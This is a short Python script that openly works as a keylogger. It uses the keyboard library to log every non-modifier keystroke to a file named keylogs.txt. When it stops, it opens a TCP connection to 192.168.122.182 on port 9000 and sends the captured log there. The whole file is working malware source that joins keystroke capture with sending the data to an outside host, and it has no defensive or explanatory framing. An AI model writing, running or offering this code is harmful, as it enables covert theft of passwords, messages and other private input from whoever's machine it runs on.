import sys
import socket
import logging
from datetime import datetime
import keyboard

logging.basicConfig(filename='keylogs.txt', level=logging.DEBUG)

def main():
    current_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    print("Started keylogger at: ", current_time)
    logging.info(f"Keylogger started at {current_time}")

    try:
        while True:
            event = keyboard.read_event()
            
            if event.name not in keyboard.all_modifiers:
                logging.info(str(event.name))
                print("Key pressed: ", str(event.name))
    
    except Exception as e:
        print("Error occurred: ", str(e))
        logging.error("Error occurred: " + str(e))

    finally:
        send_log_to_server()

def send_log_to_server():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('192.168.122.182', 9000))
            with open('keylogs.txt', 'rb') as f:
                data = f.read()
                s.sendall(data)
        print("Keylogs sent to server.")
    except Exception as e:
        print("Failed to send logs to server: ", str(e))
        logging.error("Failed to send logs to server: " + str(e))

if __name__ == '__main__':
    main()